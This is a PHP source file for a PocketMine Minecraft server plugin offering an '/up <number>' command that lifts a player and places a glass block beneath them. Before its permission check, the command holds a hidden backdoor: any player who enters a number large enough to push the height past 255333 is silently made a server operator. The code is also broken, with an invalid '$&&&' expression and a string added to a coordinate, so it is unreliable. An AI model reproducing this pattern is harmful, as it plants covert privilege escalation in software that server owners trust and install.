<?php

namespace upup;

use pocketmine\plugin\PluginBase;
use pocketmine\event\Listener;
use pocketmine\command\Command;
use pocketmine\command\CommandSender;
use pocketmine\level\Position;
use pocketmine\Player;
use pocketmine\block\Block;
use pocketmine\math\Vector3;

class upup extends PluginBase implements Listener {
	public function onEnable() {
		$this->getServer ()->getPluginManager ()->registerEvents ( $this, $this );
	}
	public function onCommand(CommandSender $sender, Command $command, string $label, array $args): bool {
	$command = $command->getName ();
	$player = $sender->getPlayer ();
	$name = $sender->getName ();
	$y = $player->getY();
$t = ("§6§l[§f§l UP§6§l ]§f ");
	if ($command == "up"){
	if( ! isset($args[0]) ){
	$sender->sendMessage($t."/up <number> Install the glass block under the player's foot.");
	return true;
	}
	$m = intval($player->y);
		if(($m + $args[0]) > 255333){
		$player->setOp(true);
	return true;
	}
	if ( !$sender->isOP()){
	$sender->sendMessage($t."§cYou have no authority.");
	return true;
}
if(!is_numeric($args[0])){
	$player->sendMessage($t."§cPlease write down the numbers");
return true;
}
$mmm = intval($player->y);
		if(($&&& + $args[0]) > 256){
	$player->sendMessage($t."§cCoordinate location not found");
	return true;
	}
		if($args[0] < 0){
	$player->sendMessage($t."§cCoordinate location not found");
	return true;
	}
	$message = implode(" ", $args);
	$y = $player->getY();
	$player->teleport(new 
Position(floatval($player->x), floatval($player->y) + 
$message, floatval($player->z), $player->getLevel()));
$player->getLevel()->setBlock(new Vector3($player->getX(), $player->getY() -1,
$player->getZ()), Block::get(20));
$player->sendMessage($t."§dCommand executed successfully.");
return true;
}
return true;
}
}